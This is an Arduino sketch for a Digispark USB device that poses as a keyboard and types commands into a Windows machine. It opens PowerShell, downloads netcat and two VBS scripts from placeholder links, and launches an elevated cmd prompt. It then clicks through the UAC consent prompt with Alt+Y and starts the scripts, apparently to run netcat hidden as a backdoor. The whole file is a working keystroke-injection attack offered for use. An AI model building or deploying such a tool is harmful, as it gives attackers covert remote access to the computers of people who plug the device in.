#include <EEPROM.h>
#include "DigiKeyboard.h"

void setup() {
  //wait for proper connection
  DigiKeyboard.delay(1000);

  //check if the script was not yet executed
  if (EEPROM.read(0) == 0) {

    //open powershell
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(1000);
    DigiKeyboard.println("powershell");
    DigiKeyboard.delay(1000);

    //download netcat
    DigiKeyboard.println("(new-object System.Net.WebClient).DownloadFile('REPLACE with download link','nc.exe')");
    delay(1000);
    //DigiKeyboard.println("(new-object System.Net.WebClient).DownloadFile('REPLACE with download link',' invisL.vbs')");
    DigiKeyboard.println("(new-object System.Net.WebClient).DownloadFile('REPLACE with download link',' invisG.vbs')");
    delay(1000);
    //DigiKeyboard.println("(new-object System.Net.WebClient).DownloadFile('REPLACE with download link',' shortcutL.vbs')");
    DigiKeyboard.println("(new-object System.Net.WebClient).DownloadFile('REPLACE with download link',' shortcutG.vbs')");
    delay(2000);
    DigiKeyboard.println("exit");
    
    //open cmd as admin
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
    DigiKeyboard.delay(1000);
    DigiKeyboard.println("powershell Start-Process cmd -Verb runAs");
    delay(1000);
    DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT); //yes for permission prompt
    delay(1000);

    //DigiKeyboard.println("color FE && mode con: cols=16 lines=1");
    
    //go to user folder where netcat was downloaded
    DigiKeyboard.println("cd %userprofile%");

    //start netcat
    //DigiKeyboard.println("start invisL.vbs");
    DigiKeyboard.println("start invisG.vbs");

    //DigiKeyboard.println("start shortcutL.vbs");
    DigiKeyboard.println("start shortcutG.vbs");

    delay(100);
    //exit cmd
    DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);

    //save that the script has been executed
    EEPROM.write(0, 1);
  }
}

void loop() {}
